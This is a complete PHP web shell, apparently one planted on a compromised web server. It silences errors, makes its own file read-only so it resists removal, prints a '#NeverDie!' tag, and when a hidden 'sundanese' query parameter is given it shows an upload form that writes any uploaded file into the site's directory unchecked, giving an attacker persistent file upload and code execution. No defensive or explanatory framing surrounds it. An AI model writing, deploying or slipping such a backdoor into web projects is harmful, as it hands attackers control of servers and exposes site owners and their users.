<?php error_reporting(0);chmod(basename($_SERVER["PHP_SELF"]), 0444);echo("#NeverDie!");if(isset($_GET["sundanese"])){echo'<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';echo'<input type="file" name="file" size="30"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';if($_POST['_upl']=="Upload"){if(@copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){echo'S';}else{echo'F';}};};
